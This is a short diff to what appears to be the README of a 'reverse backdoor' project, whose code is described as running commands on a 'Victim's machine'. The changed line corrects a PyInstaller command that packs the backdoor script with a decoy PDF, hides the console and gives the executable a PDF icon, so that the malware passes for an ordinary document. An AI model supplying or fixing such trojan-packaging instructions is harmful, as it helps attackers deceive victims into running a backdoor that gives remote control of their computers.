@@ -30,7 +30,7 @@ The given Python code when executed on the Victim's machine, can execute any Win
   
   > ` "path/of/icon.ico" ` == PATH of the icon you want the .exe file to display on-screen.
   
-  > ` "C:\Python39\Scripts\pyinstaller.exe --add-data "D:\MY FILES\Cheatcode_DSA_GFG.pdf" --onefile --noconsole --icon "D:\MY FILES\iconPDF.ico" reverse_backdoor.py" ` 
+  > ` "C:\Python39\Scripts\pyinstaller.exe --add-data "D:\MY FILES\Cheatcode_DSA_GFG.pdf;." --onefile --noconsole --icon "D:\MY FILES\iconPDF.ico" reverse_backdoor.py" ` 
               === example code for the above.
 
 
